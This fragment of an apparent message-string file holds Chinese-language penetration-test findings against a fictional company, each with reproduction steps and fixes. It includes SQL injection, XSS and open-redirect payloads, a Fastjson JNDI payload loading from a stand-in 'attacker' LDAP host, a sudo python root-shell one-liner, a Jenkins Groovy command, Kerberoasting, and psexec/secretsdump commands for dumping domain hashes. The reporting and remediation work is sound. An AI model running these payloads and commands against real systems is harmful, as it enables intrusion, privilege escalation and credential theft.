  m2453: "Jenkins（内部）",
  m2454: "网站搜索中的报错型 SQL 注入",
  m2455:
    '## 漏洞概述\n\n`www.acme.com/search` 的 `q` 参数存在**报错型 SQL 注入**（MSSQL），可泄露数据库版本、结构，并可能泄露敏感数据。\n\n## 影响\n\n- 可读取 `acme_prod` 结构及用户/订单数据\n- 报错响应降低了利用难度；风险高\n\n## 复现\n\n1. 触发报错型注入：\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. 响应返回 MSSQL 版本报错，确认存在注入\n3. 枚举数据库：`sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## 修复建议\n\n- 使用参数化查询/预编译语句，而非字符串拼接\n- 关闭生产环境的详细报错响应\n- 对数据库账号实施最小权限，并禁用 `xp_cmdshell` 等危险扩展\n',
  m2456: "www.acme.com/search q 参数中的报错型 SQL 注入",
  m2457: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → 返回 MSSQL 版本报错；可读取数据库结构。",
  m2458: "Acme 网站与管理后台外部评估",
  m2459: "api.acme.com/v1/orders?id= 通过 IDOR 泄露其他用户的订单",
  m2460: "将 id=1001 改为 id=1002 会返回另一个用户的订单，包含地址和电话号码；未做归属校验。",
  m2461: "API 的弱 JWT 密钥可被离线破解和伪造",
  m2462: "HS256 密钥 'secret' 被 john 在 5 秒内破解 → 可伪造任意 sub 以绕过鉴权。",
  m2463: "未转义的 q 参数导致搜索页出现反射型 XSS",
  m2464: "q=<script>alert(document.domain)</script> 在结果标题中被原样反射。",
  m2465: "www.acme.com 暴露 .git，可恢复源码",
  m2466: "GET /.git/HEAD → 200；git-dumper 恢复了后端源码及含数据库连接串的注释。",
  m2467: "admin.acme.com 使用默认凭据 admin/admin123",
  m2468: "登录成功；管理后台提供用户和订单管理功能。",
  m2469: "登录后通过 next 参数实现任意跳转",
  m2470: "/login?next=https://evil.example 登录后以 HTTP 302 跳转到外部站点。",
  m2471: "登录端点缺乏速率限制，可被暴力破解",
  m2472: "每分钟 1,000 次尝试，无锁定或验证码。",
  m2473: "API 500 错误暴露堆栈跟踪、路径和框架版本",
  m2474: "触发的 500 返回了含绝对路径和依赖版本的 Node.js 堆栈跟踪。",
  m2475: "Shop 使用了存在已知 RCE 的过时组件",
  m2476: "指纹识别出组件 v2.3.1，关联 CVE-2024-xxxx 反序列化 RCE。",
  m2477: "泄露的源码含硬编码数据库凭据 sa/Acme@2021",
  m2478: "git-dumper 从 www.acme.com/.git 恢复了 config.php，其中含明文数据库密码，后经确认可在内网复用。",
  m2479: "Shop Fastjson 反序列化远程命令执行",
  m2480:
    '## 漏洞概述\n\n`shop.acme.com/api/import` 使用 **Fastjson 1.2.24** 且未开启 `safeMode` 解析用户可控的 JSON。通过 `@type` 选择任意类可导致 **JNDI 注入 → 远程命令执行**。\n\n## 影响\n\n- 可在 DMZ Web 服务器（`www-data@dmz-web01`）上未授权执行任意命令\n- 结合权限提升，可获得内网立足点\n\n## 复现\n\n1. 构造 JNDI 载荷：\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import`，`Content-Type: application/json`\n3. 目标回连 dnslog 并打开反向 shell\n\n## 修复建议\n\n- 将 Fastjson 升级到 **1.2.83+** 并开启 `safeMode`\n- 为 `/api/import` 添加身份认证和来源校验\n- 限制出站流量：禁止应用服务器向外发起 LDAP/RMI\n',
  m2481: "shop.acme.com Fastjson 1.2.24 反序列化远程命令执行",
  m2482: "POST /api/import 携带 JNDI 载荷（@type:JdbcRowSetImpl）→ dnslog 回连并获得反向 shell（www-data@dmz-web01）。",
  m2483: "DMZ sudo NOPASSWD 配置错误导致本地提权至 root",
  m2484:
    "sudo -l 显示 (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' 可直接获得 root。",
  m2485: "双网卡 DMZ 主机绕过内网隔离",
  m2486: "dmz-web01 的第二块网卡位于 10.10.10.0/24，可从 DMZ 直接访问域控制器、文件服务器和 Jenkins。",
  m2487: "未授权的内部 Jenkins 脚本控制台可执行远程命令",
  m2488:
    "GET /script 无需登录即可运行 Groovy：'whoami'.execute().text → SYSTEM；从凭据库导出了域账号 acme\\\\svc_deploy。",
  m2489: "域服务账号 svc_sql 可被 Kerberoast 且使用弱密码",
  m2490: "GetUserSPNs 请求 svc_sql 的 TGS；hashcat -m 13100 离线破解出 Sql@2020。该账号属于 SQL 管理员组。",
  m2491: "完全控制内网域控制器 DC01（域管理员）",
  m2492:
    "## 漏洞概述\n\n外部 Fastjson RCE 提供了 DMZ 立足点。Sudo 提权、双网卡主机和未授权 Jenkins RCE 暴露了 `svc_deploy`——一个 **Domain Admins** 成员，从而可完全控制 **DC01**。\n\n## 影响\n\n- 域管理员权限可控制域内主机和账号\n- `secretsdump` 可导出所有域 NTLM 哈希，包括 `krbtgt`，可生成黄金票据用于持久化\n- 已达成内网目标\n\n## 复现\n\n1. 以 `svc_deploy` 登录并导出哈希：\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. 在 DC01 上获得 SYSTEM 并导出所有域哈希\n\n## 修复建议\n\n- 降低服务账号权限，移除 Domain Admins 成员资格，并实施分层管理\n- 重置 `krbtgt` 两次并轮换强服务账号密码\n- 修复 DMZ/内网隔离以及前述的 RCE/提权链\n",
  m2493: "已控制 DC01 域控制器（域管理员）— 已达成内网目标",
  m2494:
    "svc_deploy 属于 Domain Admins。psexec.py 在 DC01 上获得 SYSTEM；secretsdump 导出了含 krbtgt 的域 NTLM 哈希，完成对目标的控制。",
